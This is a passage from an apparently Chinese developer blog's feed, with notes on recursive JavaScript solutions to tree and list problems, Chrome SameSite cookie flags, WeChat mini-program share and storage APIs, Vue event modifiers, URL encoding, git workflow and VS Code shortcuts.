href="#对象的Observer属性" class="headerlink" title="对象的Observer属性"></a>对象的Observer属性</h2><p>当对象有__ob__: Observer属性时，表明对象已经被监听</p><p>此时可以用<code>JSON.parse(JSON.stringify(obj))</code>处理</p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>算法-递归</title>
      <link href="2020/08/03/%E7%AE%97%E6%B3%95-%E9%80%92%E5%BD%92/"/>
      <url>2020/08/03/%E7%AE%97%E6%B3%95-%E9%80%92%E5%BD%92/</url>
      
        <content type="html"><![CDATA[<ul><li>合并有序链表</li><li>最长公共子序列与最长公共子串</li><li>相同的树</li><li>判断二叉树是否对称</li><li>求二叉树深度</li><li>有序数组转二叉搜索树</li></ul><a id="more"></a><h2 id="合并有序链表（递归）"><a href="#合并有序链表（递归）" class="headerlink" title="合并有序链表（递归）"></a>合并有序链表（递归）</h2><p>将两个升序链表合并为一个新的 升序 链表并返回。新链表是通过拼接给定的两个链表的所有节点组成的。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：1-&gt;2-&gt;4, 1-&gt;3-&gt;4</span><br><span class="line"></span><br><span class="line">输出：1-&gt;1-&gt;2-&gt;3-&gt;4-&gt;4</span><br></pre></td></tr></table></figure><p>递归思想：比较第一个值，取小的，依次递归</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> mergeTwoLists = <span class="function"><span class="keyword">function</span>(<span class="params">l1, l2</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l1==<span class="literal">null</span>) <span class="keyword">return</span> l2</span><br><span class="line">    <span class="keyword">if</span>(l2==<span class="literal">null</span>) <span class="keyword">return</span> l1</span><br><span class="line">    <span class="keyword">if</span>(l1.val&lt;=l2.val)&#123;</span><br><span class="line">        l1.next = mergeTwoLists(l1.next,l2)</span><br><span class="line">        <span class="keyword">return</span> l1</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        l2.next = mergeTwoLists(l1,l2.next)</span><br><span class="line">        <span class="keyword">return</span> l2</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="最长公共子序列和最长公共子串"><a href="#最长公共子序列和最长公共子串" class="headerlink" title="最长公共子序列和最长公共子串"></a>最长公共子序列和最长公共子串</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">A:&quot;helloworld&quot;    B=&quot;loop&quot;    </span><br><span class="line">最长公共子序列:loo</span><br><span class="line">最长公共子串 ：lo （必须连续）</span><br><span class="line"></span><br><span class="line">最长公共子序列：</span><br><span class="line"> 输入: X=x1x2…xn, Y=y1y2…ym,  输出: X和Y的LCS </span><br><span class="line"> 定义: c[i][j] = Xi,Yj的LCS长度(OSP)</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2020/03/06/3btMhq.png" alt="3btMhq.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">最长公共子串类似</span><br><span class="line">xi=yj，c[i][j]=c[i-1][j-1]+1，很显然，当比对的位字符一样时，能得到该状态转移方程。</span><br><span class="line">xi≠yj，c[i][j]=0，说明无论之前有没有连续的子串，到了这个不相等的位置会直接断掉，所以c[i][j]=0;</span><br></pre></td></tr></table></figure><h2 id="相同的树"><a href="#相同的树" class="headerlink" title="相同的树"></a>相同的树</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">给定两个二叉树，编写一个函数来检验它们是否相同。</span><br><span class="line"></span><br><span class="line">如果两个树在结构上相同，并且节点具有相同的值，则认为它们是相同的。</span><br><span class="line"></span><br><span class="line">示例 1:</span><br><span class="line"></span><br><span class="line">输入:       1         1</span><br><span class="line">          / \       / \</span><br><span class="line">         2   3     2   3</span><br><span class="line"></span><br><span class="line">        [1,2,3],   [1,2,3]</span><br><span class="line"></span><br><span class="line">输出: true</span><br><span class="line">示例 2:</span><br><span class="line"></span><br><span class="line">输入:      1          1</span><br><span class="line">          /           \</span><br><span class="line">         2             2</span><br><span class="line"></span><br><span class="line">        [1,2],     [1,null,2]</span><br><span class="line"></span><br><span class="line">输出: false</span><br><span class="line">示例 3:</span><br><span class="line"></span><br><span class="line">输入:       1         1</span><br><span class="line">          / \       / \</span><br><span class="line">         2   1     1   2</span><br><span class="line"></span><br><span class="line">        [1,2,1],   [1,1,2]</span><br><span class="line"></span><br><span class="line">输出: false</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> isSameTree = <span class="function"><span class="keyword">function</span>(<span class="params">p, q</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(p == <span class="literal">null</span> &amp;&amp; q==<span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>((p==<span class="literal">null</span>&amp;&amp;q!==<span class="literal">null</span>) || (p!==<span class="literal">null</span>&amp;&amp;q==<span class="literal">null</span>)) <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(p.val!==q.val) <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> isSameTree(p.left,q.left) &amp;&amp; isSameTree(p.right,q.right)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="判断二叉树是否对称"><a href="#判断二叉树是否对称" class="headerlink" title="判断二叉树是否对称"></a>判断二叉树是否对称</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">给定一个二叉树，检查它是否是镜像对称的。</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">例如，二叉树 [1,2,2,3,4,4,3] 是对称的。</span><br><span class="line"></span><br><span class="line">    1</span><br><span class="line">   / \</span><br><span class="line">  2   2</span><br><span class="line"> / \ / \</span><br><span class="line">3  4 4  3</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">但是下面这个 [1,2,2,null,3,null,3] 则不是镜像对称的:</span><br><span class="line"></span><br><span class="line">    1</span><br><span class="line">   / \</span><br><span class="line">  2   2</span><br><span class="line">   \   \</span><br><span class="line">   3    3</span><br></pre></td></tr></table></figure><ul><li>和上题类似，把根节点拿掉，就是判断两个树的关系</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> isSymmetric = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root === <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> p = root.left</span><br><span class="line">    <span class="keyword">var</span> q = root.right</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params">p,q</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(p==<span class="literal">null</span>&amp;&amp;q==<span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>((p!==<span class="literal">null</span>&amp;&amp;q==<span class="literal">null</span>)||(p==<span class="literal">null</span>&amp;&amp;q!==<span class="literal">null</span>)) <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(p.val!==q.val) <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> (fn(p.left,q.right)&amp;&amp;fn(p.right,q.left))</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> fn(p,q)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="求二叉树深度"><a href="#求二叉树深度" class="headerlink" title="求二叉树深度"></a>求二叉树深度</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">给定一个二叉树，找出其最大深度。</span><br><span class="line"></span><br><span class="line">二叉树的深度为根节点到最远叶子节点的最长路径上的节点数。</span><br><span class="line"></span><br><span class="line">说明: 叶子节点是指没有子节点的节点。</span><br><span class="line"></span><br><span class="line">示例：</span><br><span class="line">给定二叉树 [3,9,20,null,null,15,7]，</span><br><span class="line"></span><br><span class="line">    3</span><br><span class="line">   / \</span><br><span class="line">  9  20</span><br><span class="line">    /  \</span><br><span class="line">   15   7</span><br><span class="line">返回它的最大深度 3 。</span><br></pre></td></tr></table></figure><ul><li>递归思想</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> maxDepth = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!root) <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> left = maxDepth(root.left)</span><br><span class="line">        <span class="keyword">let</span> right = maxDepth(root.right)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Math</span>.max(left,right) + <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="有序数组转二叉搜索树"><a href="#有序数组转二叉搜索树" class="headerlink" title="有序数组转二叉搜索树"></a>有序数组转二叉搜索树</h2><p>将一个按照升序排列的有序数组，转换为一棵高度平衡二叉搜索树。</p><p>本题中，一个高度平衡二叉树是指一个二叉树每个节点 的左右两个子树的高度差的绝对值不超过 1。</p><p>示例:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">给定有序数组: [-10,-3,0,5,9],</span><br><span class="line"></span><br><span class="line">一个可能的答案是：[0,-3,9,-10,null,5]，它可以表示下面这个高度平衡二叉搜索树：</span><br><span class="line"></span><br><span class="line">      0</span><br><span class="line">     / \</span><br><span class="line">   -3   9</span><br><span class="line">   /   /</span><br><span class="line"> -10  5</span><br></pre></td></tr></table></figure><ul><li>每次取中间的值作为根节点</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sortedArrayToBST = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(nums.length === <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">null</span></span><br><span class="line">    <span class="keyword">let</span> mid = <span class="built_in">parseInt</span>(nums.length / <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">let</span> root = <span class="keyword">new</span> TreeNode(nums[mid])</span><br><span class="line">    root.left = sortedArrayToBST(nums.slice(<span class="number">0</span>, mid))</span><br><span class="line">    root.right = sortedArrayToBST(nums.slice(mid + <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> root</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// parseInt(nums.length / 2)      =&gt;     nums.length &gt;&gt; 1</span></span><br></pre></td></tr></table></figure><p>   -</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>日常-2020.7.27</title>
      <link href="2020/07/27/%E6%97%A5%E5%B8%B8-2020.7.27/"/>
      <url>2020/07/27/%E6%97%A5%E5%B8%B8-2020.7.27/</url>
      
        <content type="html"><![CDATA[<ul><li>谷歌浏览器中对第三方的cookie设置</li><li>SameSite by default cookies</li><li>Cookies without SameSite must be secure</li></ul><a id="more"></a><h4 id="SameSite-by-default-cookies"><a href="#SameSite-by-default-cookies" class="headerlink" title="SameSite by default cookies"></a>SameSite by default cookies</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Treat cookies that don&apos;t specify a SameSite attribute as if they were SameSite=Lax. Sites must specify SameSite=None in order to enable third-party usage. – Mac, Windows, Linux, Chrome OS, Android</span><br><span class="line"></span><br><span class="line">将未指定SameSite属性的cookie视为SameSite=Lax(默认),网站必须指定SameSite=None才能启用第三方cookie。</span><br><span class="line">把这个设置关了就允许所有的第三方cookie</span><br></pre></td></tr></table></figure><h4 id="Cookies-without-SameSite-must-be-secure"><a href="#Cookies-without-SameSite-must-be-secure" class="headerlink" title="Cookies without SameSite must be secure"></a>Cookies without SameSite must be secure</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">If enabled, cookies without SameSite restrictions must also be Secure. If a cookie without SameSite restrictions is set without the Secure attribute, it will be rejected. This flag only has an effect if &quot;SameSite by default cookies&quot; is also enabled. – Mac, Windows, Linux, Chrome OS, Android</span><br><span class="line"></span><br><span class="line">如果启用，没有SameSite限制的cookie也必须是安全的。如果没有设置SameSite限制的cookie没有Secure属性，它将被拒绝。此标志仅在启用&apos;sameSite by default cookies&apos;时有效。</span><br></pre></td></tr></table></figure><p>如果你想加 SameSite=none 属性，那么该 Cookie 就必须同时加上 Secure 属性，表示只有在 HTTPS 协议下该 Cookie 才会被发送。 </p><p>SameSite 可以有下面三种值：</p><ol><li>Strict 仅允许一方请求携带 Cookie，即浏览器将只发送相同站点请求的 Cookie，即当前网页 URL 与请求目标 URL 完全一致。</li><li>Lax 允许部分第三方请求携带 Cookie</li><li>None 无论是否跨站都会发送 Cookie</li></ol><p>之前默认是 None 的，Chrome80 后默认是 Lax</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果允许了第三方的cookie，就不用在本地配置xxx.域名了</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>日常-2020.7.23</title>
      <link href="2020/07/23/%E6%97%A5%E5%B8%B8-2020.7.23/"/>
      <url>2020/07/23/%E6%97%A5%E5%B8%B8-2020.7.23/</url>
      
        <content type="html"><![CDATA[<ul><li>onShareAppMessage(Object object)</li><li>打开小程序分享链接时触发函数顺序</li><li>getStorage和getStorgeSync</li><li>V-on的修饰符</li><li>getqueryStorage：封装好的获取参数的函数</li><li>url编码与解码</li><li>再次熟悉git上传流程</li></ul><a id="more"></a><h2 id="onShareAppMessage-Object-object"><a href="#onShareAppMessage-Object-object" class="headerlink" title="onShareAppMessage(Object object)"></a>onShareAppMessage(Object object)</h2><p>监听用户点击页面内转发按钮（<a href="https://developers.weixin.qq.com/miniprogram/dev/component/button.html" target="_blank" rel="noopener">button</a> 组件 <code>open-type=&quot;share&quot;</code>）或右上角菜单“转发”按钮的行为，并自定义转发内容。 </p><table><thead><tr><th>参数</th><th>类型</th><th>说明</th><th>最低版本</th></tr></thead><tbody><tr><td>from</td><td>String</td><td>转发事件来源。 <code>button</code>：页面内转发按钮； <code>menu</code>：右上角转发菜单</td><td><a href="https://developers.weixin.qq.com/miniprogram/dev/framework/compatibility.html" target="_blank" rel="noopener">1.2.4</a></td></tr><tr><td>target</td><td>Object</td><td>如果 <code>from</code> 值是 <code>button</code>，则 <code>target</code> 是触发这次转发事件的 <code>button</code>，否则为 <code>undefined</code></td><td><a href="https://developers.weixin.qq.com/miniprogram/dev/framework/compatibility.html" target="_blank" rel="noopener">1.2.4</a></td></tr></tbody></table><p>target为button时，有以下参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dataset:&#123;&#125;</span><br><span class="line">id:&quot;&quot;</span><br><span class="line">offsetLeft:</span><br><span class="line">offsetTop:</span><br></pre></td></tr></table></figure><p>此事件处理函数需要 return 一个 Object，用于自定义转发内容，返回内容如下：</p><p><strong>自定义转发内容</strong> 基础库 <a href="https://developers.weixin.qq.com/miniprogram/dev/framework/compatibility.html" target="_blank" rel="noopener">2.8.1</a> 起，分享图支持云图片。</p><table><thead><tr><th>字段</th><th>说明</th><th>默认值</th><th>最低版本</th></tr></thead><tbody><tr><td>title</td><td>转发标题</td><td>当前小程序名称</td><td></td></tr><tr><td>path</td><td>转发路径</td><td>当前页面 path ，必须是以 / 开头的完整路径</td><td></td></tr><tr><td>imageUrl</td><td>自定义图片路径，可以是本地文件路径、代码包文件路径或者网络图片路径。支持PNG及JPG。显示图片长宽比是 5:4。</td><td>使用默认截图</td><td>1.5.0</td></tr></tbody></table><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//封装好的函数</span></span><br><span class="line">onShareAppMessage(res) &#123;</span><br><span class="line">        <span class="keyword">if</span> (res.from === <span class="string">'button'</span>) &#123;</span><br><span class="line">            <span class="keyword">let</span> data = res.target.dataset.data</span><br><span class="line">            <span class="keyword">let</span> params = <span class="string">'?fromShare=1&amp;'</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> data) &#123;</span><br><span class="line">                <span class="keyword">if</span> (data.hasOwnProperty(key)) &#123;</span><br><span class="line">                    params += <span class="string">`<span class="subst">$&#123;key&#125;</span>=<span class="subst">$&#123;data[key]&#125;</span>&amp;`</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            params = params.substring(<span class="number">0</span>, params.length - <span class="number">1</span>)</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">`【分享参数】：<span class="subst">$&#123;res.target.dataset.path&#125;</span><span class="subst">$&#123;params&#125;</span>`</span>)</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                title: res.target.dataset.title || <span class="string">''</span>,</span><br><span class="line">                path: <span class="string">`<span class="subst">$&#123;res.target.dataset.path&#125;</span><span class="subst">$&#123;params&#125;</span>`</span> || <span class="string">''</span>,</span><br><span class="line">                imageUrl: res.target.dataset.url || <span class="string">''</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="打开小程序分享链接时触发函数顺序"><a href="#打开小程序分享链接时触发函数顺序" class="headerlink" title="打开小程序分享链接时触发函数顺序"></a>打开小程序分享链接时触发函数顺序</h2><ul><li>首先会触发<code>APP.vue中的onShow函数</code></li><li>然后会触发打开页面的<code>onLoad与onShow页面</code></li></ul><h2 id="getStorage和getStorgeSync"><a href="#getStorage和getStorgeSync" class="headerlink" title="getStorage和getStorgeSync"></a>getStorage和getStorgeSync</h2><p><strong>1.缓存介绍：</strong></p><p><em>每个微信小程序都可以有自己的本地缓存，可以通过 wx.setStorage（wx.setStorageSync）、wx.getStorage（wx.getStorageSync）、wx.clearStorage（wx.clearStorageSync）可以对本地缓存进行设置、获取和清理。同一个微信用户，同一个小程序 storage 上限为 10MB。localStorage 以用户维度隔离，同一台设备上，A 用户无法读取到 B 用户的数据。</em></p><p><strong>2. wx.getStorage和wx.getStorageSync的区别：</strong></p><p>wx.setStorage(object)是一个异步接口，参数object包含key和data（需要存储的内容），他有3个回调函数：success（接口调用成功的回调函数）、fail（接口调用失败的回调函数）、complete（接口调用结束的回调函数，调用成功、失败都会执行）。我们可以通过3个回调函数进一步优化一功能。</p><p>wx.setStorageSync(key，data)是一个同步接口，需要接受key和data（String/Object）2个参数，他没有上述三个回调函数。</p><h2 id="V-on的修饰符"><a href="#V-on的修饰符" class="headerlink" title="V-on的修饰符"></a>V-on的修饰符</h2><ul><li><code>.stop</code> - 调用 <code>event.stopPropagation()</code>。</li><li><code>.prevent</code> - 调用 <code>event.preventDefault()</code>。</li><li><code>.capture</code> - 添加事件侦听器时使用 capture 模式。</li><li><code>.self</code> - 只当事件是从侦听器绑定的元素本身触发时才触发回调。</li><li><code>.{keyCode | keyAlias}</code> - 只当事件是从特定键触发时才触发回调。</li><li><code>.native</code> - 监听组件根元素的原生事件。</li><li><code>.once</code> - 只触发一次回调。</li><li><code>.left</code> - (2.2.0) 只当点击鼠标左键时触发。</li><li><code>.right</code> - (2.2.0) 只当点击鼠标右键时触发。</li><li><code>.middle</code> - (2.2.0) 只当点击鼠标中键时触发。</li><li><code>.passive</code> - (2.3.0) 以 <code>{ passive: true }</code> 模式添加侦听器</li></ul><h2 id="getqueryStorage：封装好的获取参数的函数"><a href="#getqueryStorage：封装好的获取参数的函数" class="headerlink" title="getqueryStorage：封装好的获取参数的函数"></a>getqueryStorage：封装好的获取参数的函数</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">getQuery() &#123;   <span class="comment">//获取当前页面的参数</span></span><br><span class="line">    <span class="keyword">const</span> routerHistory = getCurrentPages();</span><br><span class="line">    <span class="keyword">return</span> routerHistory[routerHistory.length - <span class="number">1</span>].options;</span><br><span class="line">&#125;,</span><br><span class="line">getQueryStorage(key) &#123;   <span class="comment">//根据key值来获取对应的参数值</span></span><br><span class="line">    <span class="keyword">const</span> query = <span class="keyword">this</span>.getQuery();</span><br><span class="line">    <span class="keyword">if</span> (query &amp;&amp; (query[key] || query[key] == <span class="string">'0'</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> query[key];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> RootStore.getters.queryStorage[key];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="url编码与解码"><a href="#url编码与解码" class="headerlink" title="url编码与解码"></a>url编码与解码</h2><p>网页URL只能使用英文、数字、还有一些特定的字符，若出现中文字符就必须经过编码解码，否则服务器无法识别</p><p>编码方法有三种：</p><table><thead><tr><th>方法</th><th>规则</th><th>特点</th></tr></thead><tbody><tr><td>escape（编码） unescape</td><td>除了ASCII字母、数字、标点符号”@ * _ + - . /“以外，对其他所有字符进行编码</td><td>不提倡</td></tr><tr><td>encodeURI（编码） decodeURI（解码）</td><td>除了常见的符号以外，对其他一些在网址中有特殊含义的符号”; / ? : @ &amp; = + $ , #”，也不进行编码</td><td>encodeURI()是Javascript中真正用来对URL编码的函数，它着眼于对整个URL进行编码</td></tr><tr><td>encodeURIComponent（编码）  decodeURIComponent解码）</td><td>在encodeURI()中不被编码的符号”; / ? : @ &amp; = + $ , #”，在encodeURIComponent()中统统会被编码</td><td>与encodeURI()的区别是，它用于对URL的组成部分进行个别编码，而不用于对整个URL进行编码</td></tr></tbody></table><h2 id="再次熟悉git上传流程"><a href="#再次熟悉git上传流程" class="headerlink" title="再次熟悉git上传流程"></a>再次熟悉git上传流程</h2><ul><li>git status -sb   显示当前所有文件的状态</li><li>git add .</li><li>git commit -m ‘xxxx’</li><li>git push</li></ul><p>在git merge master时，由于本地库的代码跟远程库有冲突，会显示以下界面，提示你输入合并的必要性</p><p><img src="http://quanzhan.applemei.com/ueditor/php/upload/image/20190124/1548296413834552.jpeg" alt="1"></p><p>只需要输入<code>:wq</code>退出即可</p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>日常-2020.7.19</title>
      <link href="2020/07/19/%E6%97%A5%E5%B8%B8-2020.7.19/"/>
      <url>2020/07/19/%E6%97%A5%E5%B8%B8-2020.7.19/</url>
      
        <content type="html"><![CDATA[<ul><li>vscode一些常见快捷键</li><li>feature分支（扩展分支）</li><li>Vue中watch的用法</li><li>ref与refs</li><li>debugger</li></ul><a id="more"></a><h2 id="vscode一些常见快捷键"><a href="#vscode一些常见快捷键" class="headerlink" title="vscode一些常见快捷键"></a>vscode一些常见快捷键</h2><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td><strong>Ctrl + Shift + P</strong>，F1</td><td>显示命令面板</td><td></td></tr><tr><td><strong>Ctrl + B</strong></td><td>显示/隐藏侧边栏</td><td>很实用</td></tr><tr><td>Ctrl + \</td><td><strong>创建多个编辑器窗口</strong></td><td>【重要】抄代码利器</td></tr><tr><td><strong>Ctrl + 1、2</strong></td><td>聚焦到第 1、第 2 个编辑器</td><td>同上重要</td></tr><tr><td><strong>ctrl +/-</strong></td><td>将工作区放大/缩小（包括代码字体、左侧导航栏）</td><td>在投影仪场景经常用到</td></tr><tr><td>Ctrl + J</td><td>显示/隐藏控制台</td><td></td></tr><tr><td><strong>Ctrl + Shift + N</strong></td><td>重新开一个软件的窗口</td><td>很常用</td></tr></tbody></table><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td><strong>Ctrl + 左右方向键</strong></td><td>在<strong>单词</strong>之间移动光标</td><td>很常用</td></tr><tr><td>Ctrl + Home</td><td>将光标定位到文章的第一行</td><td></td></tr><tr><td>Ctrl + End</td><td>将光标定位到文章的最后一行</td><td></td></tr><tr><td>Ctrl+Shift+\</td><td>跳转到匹配的括号</td><td></td></tr><tr><td>Ctrl + Home</td><td>将光标定位到文章的第一行</td><td></td></tr><tr><td>Ctrl + End</td><td>将光标定位到文章的最后一行</td><td></td></tr><tr><td><strong>Alt + Shift + ↓</strong></td><td>将代码向下复制</td><td>写重复代码的利器</td></tr><tr><td><strong>Ctrl + P</strong></td><td>在当前的项目工程里，<strong>全局</strong>搜索文件名</td><td></td></tr><tr><td>Ctrl + F</td><td>在当前文件中搜索代码，光标在搜索框里</td><td></td></tr><tr><td>Ctrl + 左键 /  F12</td><td>跳转到定义位置</td><td></td></tr><tr><td>Alt + 左箭头 / 右箭头</td><td>跳转上次 / 下次 看代码的位置</td></tr></tbody></table><h2 id="feature分支（扩展分支）"><a href="#feature分支（扩展分支）" class="headerlink" title="feature分支（扩展分支）"></a>feature分支（扩展分支）</h2><ol><li>新建dev分支(对于没有分支的人)：<code>git checkout -b dev</code> （-b表示创建新的分支）</li><li>拉取最新数据：<code>git pull origin dev</code></li><li>建立一个新分支，名称为具体内容，用于开发新功能：<code>git checkout -b 